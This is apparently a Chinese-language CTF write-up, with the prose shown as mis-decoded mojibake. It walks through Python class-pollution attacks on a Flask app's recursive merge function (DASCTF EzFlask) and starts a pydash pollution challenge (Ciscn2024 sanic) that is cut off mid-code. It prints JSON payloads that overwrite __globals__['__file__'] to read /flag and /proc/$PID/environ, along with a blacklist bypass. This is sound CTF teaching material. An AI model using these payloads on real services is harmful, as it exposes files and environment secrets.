id="dasctf-2023-0x401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›ezflask"><a class="markdownIt-Anchor" href="#dasctf-2023-0x401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›ezflask">#</a> [DASCTF 2023 &amp; 0X401 ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›] EzFlaskï¼š</h2><p>â€‹ï¼ˆå°å£°å˜€å’•ï¼‰ï¼šå‰é¢æ‰åˆšè¯´äº†æ²¡é‡åˆ° merge çš„é¢˜ï¼Œè¿™å°±é‡åˆ°äº†ã€‚</p><p>â€‹é¦–å…ˆï¼Œæ‰“å¼€å°±æ˜¯æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å®¡è®¡ä¸€ä¸‹ï¼Œå‘ç°äº†å‡ ä¸ªç‚¹ï¼Œé¦–å…ˆæ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><p>â€‹å°±åƒæœ€å¼€å§‹è¯´çš„é‚£æ ·ï¼Œå­˜åœ¨ merge å‡½æ•°ï¼Œç„¶åä¸‹ä¸€ä¸ªæœ‰ç”¨çš„ä¿¡æ¯æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>â€‹è¯»å–äº†å†…ç½®å±æ€§ __file__ çš„å€¼ï¼Œæœ€åä¸€ä¸ªé‡è¦çš„ä¿¡æ¯æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå‘ç°ï¼Œåœ¨è¯¥å‡½æ•°ä¸­è°ƒç”¨äº† merge () å‡½æ•°ï¼Œå¹¶ä¸”ï¼Œdata å¯æ§ï¼Œé‚£ä¹ˆï¼Œpayload åº”è¯¥å°±æ˜¾è€Œæ˜“è§äº†ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;b&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__class__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__file__&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/flag&quot;</span>#å½“flagåœ¨æ ¹ç›®å½•ä¸‹ä»¥åŠflagæ–‡ä»¶åçŸ¥é“çš„æƒ…å†µä¸‹</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/283dc0e8e2fa4c809e8dd7356a9cfe04.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä½†æ˜¯ï¼Œä¸Šä¼ å´å¤±è´¥äº†ï¼Ÿï¼ˆè¿™å„¿å¯èƒ½ä¼šå‡ºç°ä¸¤ä¸ªé—®é¢˜ï¼Œé™¤äº†é»‘åå•æœ¬èº«çš„é—®é¢˜å¤–ï¼Œè¿˜æœ‰ä¸ªé‡ç‚¹é—®é¢˜ï¼Œä¹Ÿä¼šå¯¼è‡´å¤±è´¥ï¼Œå°±æ˜¯ä¸€å®šè¦æŠŠ Content-Type ä¿®æ”¹ä¸º<strong> application/json</strong>ï¼‰çœ‹çœ‹è¿™å„¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br></pre></td></tr></table></figure><p>â€‹è™½ç„¶æŒºæ˜æ˜¾çš„ï¼Œä½†è¿˜æ˜¯å¾ˆé˜´ã€‚å¾ˆæ˜¾ç„¶ï¼Œåœ¨ check å‡½æ•°ä¸‹ï¼Œæœ‰ä¸ªä¸é»‘åå•çš„æ¯”è¾ƒï¼Œæ¨æµ‹åº”è¯¥æ˜¯è¿™å„¿è¿‡ä¸äº†ï¼Œä¸è¿‡ï¼Œå½“æˆ‘ä»¬ä¾æ¬¡æŠŠé‚£å‡ ä¸ªå˜é‡ä¿®æ”¹ä¸€ä¸‹ä¹‹åï¼Œå‘ç°ï¼Œå½“ <code>__init__</code> è¢«ä¿®æ”¹æˆ <code>__int__</code> åï¼Œè¿”å›çš„æ˜¯ Register Successï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œä¼¼ä¹åªéœ€è¦ç»•è¿‡ <code>__init__</code> å°±è¡Œäº†ï¼Œå…ˆåšå¦‚ä¸‹æµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(a.__class__.check.__globals__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x00000122A3EB56D0&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;D:\\html study\\PyCharm Project\\flask_pydash1\\test.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;A&#x27;: &lt;class &#x27;__main__.A&#x27;&gt;, &#x27;a&#x27;: &lt;__main__.A object at 0x00000122A405FA50&gt;&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹å‘ç°æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹è±¡çš„æ–¹æ³•æ¥è·å– <code>__globals__</code> å…¨å±€å˜é‡ï¼Œæ‰€ä»¥ payload å¯ä»¥å¦‚ä¸‹æ„é€ ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;b&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__class__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;check&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__file__&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/flag&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹ä½†æ˜¯æœ€åè¯»å–æ ¹è·¯ç”±çš„æ—¶å€™å‡ºç°äº†å“¥é—®é¢˜ï¼Œé‚£å°±æ˜¯ï¼Œflag æ–‡ä»¶åä¸å¯¹ã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/f39a01d5d0ed4bbaac39251c83970cdc.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä»¤äººçª’æ¯çš„æ“ä½œã€‚ä¸è¿‡æœ‰ä¸€ç‚¹å„¿æˆ–è®¸æœ‰ç‚¹å„¿å¸Œæœ›ï¼Œé‚£å°±æ˜¯ç¯å¢ƒå˜é‡ï¼Œå¦‚æœç¯å¢ƒå˜é‡é‡Œé¢ä¹Ÿæ²¡æœ‰çš„è¯ï¼Œé‚£æˆ‘å¯å°±çœŸæ²¡æ³•äº†ï¼Œè¯´å¹²å°±å¹²ï¼Œé¦–å…ˆï¼Œç¯å¢ƒå˜é‡å¯ä»¥é€šè¿‡  <code>/proc/$PID/environ</code>  æ¥è¯»å–ï¼Œè¿™é‡Œæ¨æµ‹æœ‰å¯èƒ½éœ€è¦ç”¨åˆ°çˆ†ç ´ã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5d2180dbf885469a822d061ec3e4c913.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¹‹åè¯»å–æ ¹è·¯ç”±ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/dfd34f6d7e2f4a6bbdbbe3c0491905c5.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿æ°”å¥½ï¼Œflag åˆšå¥½å°±åœ¨ç¯å¢ƒå˜é‡é‡Œã€‚flag å¦‚ä¸‹ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1084bd02-8273-4a0b-a490-08451805df3a&#125;</span><br></pre></td></tr></table></figure><h2 id="ciscn2024-åˆèµ›-sanic"><a class="markdownIt-Anchor" href="#ciscn2024-åˆèµ›-sanic">#</a> [Ciscn2024 åˆèµ›] sanic</h2><p>â€‹æ ¹è·¯ç”±æç¤ºï¼š where is my flag?ï¼Œf12 åå‘ç°æç¤ºäº† /src è·¯ç”±ï¼Œè®¿é—®åè·å¾—æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>â€‹åˆæ­¥å®¡ä¸€ä¸‹é€»è¾‘ï¼Œæœ‰ç”¨çš„ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br></pre></td></tr></table></figure><p>â€‹ä¸€çœ¼çœ‹ä¸Šå»æ²¡ä»€ä¹ˆï¼Œä½†æ˜¯å’Œä¸‹é¢è¿™ä¸ªç»“åˆèµ·æ¥å°±ä¸ä¸€æ ·äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span 